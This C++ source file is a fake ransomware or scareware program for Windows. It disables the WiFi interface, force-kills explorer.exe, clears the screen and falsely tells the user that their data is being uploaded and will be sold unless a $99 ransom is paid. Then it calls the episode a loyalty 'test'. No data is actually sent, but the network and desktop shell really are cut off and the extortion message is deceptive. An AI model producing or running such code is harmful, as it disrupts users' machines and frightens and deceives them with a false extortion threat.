#include<iostream>
#include<unistd.h>
using namespace std;

int main()
{   string choice;
    system("netsh interface set interface WiFi disable");
    system("Taskkill /F /IM explorer.exe");
    system("cls");
    cin.get();
    cout<< "Your Data is being uploaded to our server.\nTurning of the computer will result in us posting whatever data recived on the internet.\nYou have two options either pay our ransom or you data will be sold on the internet";
    cout << "Ransom amount is $99";
    cout << "Do you want to pay the ransom.\nY/N? ";
    cin >> choice;
    if (choice == "y"||choice=="Y")
    {
        cout << "Well Done, your ransom is forgiven"; sleep(2); cout << "This was a test and you were loyal";
        cin.get();
    }
    else if(choice == "n"||choice == "N")
    {
        cout << "You're a disgrace! This was a test and you have failed. "; sleep(2); cout << "Keep your ransom money"; sleep(1); cout << "Your data has been sucessfully updated";
    }
}